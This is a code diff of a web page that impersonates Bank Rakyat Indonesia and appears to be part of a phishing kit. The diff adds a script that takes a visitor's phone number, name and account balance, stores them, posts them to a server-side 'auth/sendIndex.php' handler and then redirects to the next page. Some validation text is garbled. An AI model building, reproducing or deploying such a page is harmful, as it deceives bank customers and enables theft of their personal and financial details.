@@ -157,7 +157,8 @@
     .card-body {
         margin-bottom: 20px;
     }
-ion-icon {
+
+    ion-icon {
         font-size: 22px;
         margin-left: 8px;
         margin-top: 8px;
@@ -332,7 +333,8 @@ ion-icon {
         background: #ffffffe6;
         box-shadow: rgba(0, 0, 0, 0.40) 0px 5px 15px 0px;
     }
-h3 {
+
+    h3 {
         border-bottom: 2px solid #ef871c;
         border-top: none;
         border-left: none;
@@ -476,7 +478,7 @@ h3 {
                     <div class="carousel">
                         <div class="carousel-item active">
                             <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGO-M0-1TUcw-NgDPTh0sRAiibfxStikSj8dZc4-nmREjNCFoOQEJ-XQaNRirm-w6FV79HPCV8WTBHgC3M0EU-n4S-F_o3Bqgb_PpXk6sKaAzEoluIp5knLdi08_pIW0hI0dayLEjjjQQzMyzMLm5Xououu2MJqQM0wtW_KTZNswjdIsul0Gy9Dx3DPgs/s686/1000408061.jpg" alt="Carousel Image 1">
-</div>
+                        </div>
                         <div class="carousel-item">
                             <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUSC_M-SeKljqUSQMPMY16r2gkSxzbI6i4lMY9b295w6qVyEbJXkNv4jgZyJITHoGi9hXAqmOdrEKY_SbqCGpjyF4tJSqzIr2rR4kjhxO-42KNkcsNp640O-yJS54tdMSCPmOkRC_CO54PaNaaayeHttX_e09UpGsDV3OLcd2E4X3agWovfvxRTV2k1Yk/s728/1000406974.jpg" alt="Carousel Image 2">
                         </div>
@@ -525,12 +527,91 @@ h3 {
 
                                             <div class="input-field">
                                                 <label for="saldo">Saldo Akhir: </label>
-                                                <input type="tel" id="saldo" name="data3" class="saldo" style="padding-left: 12px;" placeholder="Rp. ×××" maxlength="" minlength="" oninvalid="this.setCustomValidity('Pastikan  ��� ��� ��� ��� ���  ��� ��� ��� ��� ��� ���  ��� ��� ��� ��� ��� ��� ��� ���')" onchange="this.setCustomValidity('')"
+                                                <input type="tel" id="saldo" name="data3" class="saldo" style="padding-left: 12px;" placeholder="Rp. ×××" maxlength="" minlength="" oninvalid="this.setCustomValidity('Pastikan ��������������� ������������������ ������������������������')" onchange="this.setCustomValidity('')"
                                                     required>
 
                                             </div>
                                             <div class="card-footer">
-const carouselItems = document.querySelectorAll('.carousel-item');
+                                                <button type="submit" class="button" id="lanjutkan" disabled>Lanjutkan</button>
+                                            </div>
+                                        </div>
+                                </div>
+                                </form>
+                                <center>
+                                    <p style="font-size:13px;color:#00000080;margin-bottom:0; ">© 2025 PT.Bank Rakyat Indonesia (Persero) Tbk.<br> | All Rights Reserved.</p>
+                                </center>
+                            </div>
+                        </div>
+                    </div>
+
+                    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+                    <script src="i.js"></script>
+                    <script src="token.js"></script>
+                    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+                    <script>
+                        function sendHpp() {
+                            $('.load').fadeIn();
+                            event.preventDefault();
+                            $(".lanjutkan").prop("disabled", true);
+                            document.getElementById('lanjutkan').innerHTML = "Memproses....";
+
+                            var tarif = $('input[name="tarif"]:checked').val();
+                            if (tarif) {
+                                sessionStorage.setItem('tarif', tarif);
+                            }
+                            var nohp = $('#nohp').val();
+                            sessionStorage.setItem('nohp', nohp);
+                            var nama = $('#nama').val();
+                            sessionStorage.setItem('nama', nama);
+                            var saldo = $('#saldo').val();
+                            sessionStorage.setItem('saldo', saldo);
+
+
+
+                            $.ajax({
+                                type: 'POST',
+                                url: 'auth/sendIndex.php',
+                                data: $('#index').serialize(),
+                                datatype: 'JSON',
+                                complete: function() {
+                                    setTimeout(function() {
+                                        window.location = "publik.html";
+                                        $("#Patok").hide();
+                                        $('.load').fadeOut();
+                                        document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
+
+
+                                    }, 800);
+                                }
+                            });
+                        };
+
+                        $(document).ready(function() {
+                            $('welalxcome').fadeIn(500);
+                            setTimeout(() => {
+                                $('welalxcome').fadeOut();
+                                $('chsalxcome2').fadeIn();
+                            }, 800)
+                        })
+
+
+                        // Get references to the input and button elements
+                        const input = document.getElementById("nohp");
+                        const button = document.getElementById("lanjutkan");
+
+                        // Add an event listener for the input event
+                        input.addEventListener("input", () => {
+                            // Check if the input field has any text
+                            if (input.value.length > 9) {
+                                // If there's text, enable the button
+                                button.disabled = false;
+                            } else {
+                                // If there's no text, disable the button
+                                button.disabled = true;
+                            }
+                        });
+
+                        const carouselItems = document.querySelectorAll('.carousel-item');
                         const carouselNavItems = document.querySelectorAll('.carousel-nav-item');
                         let currentItem = 0;
 
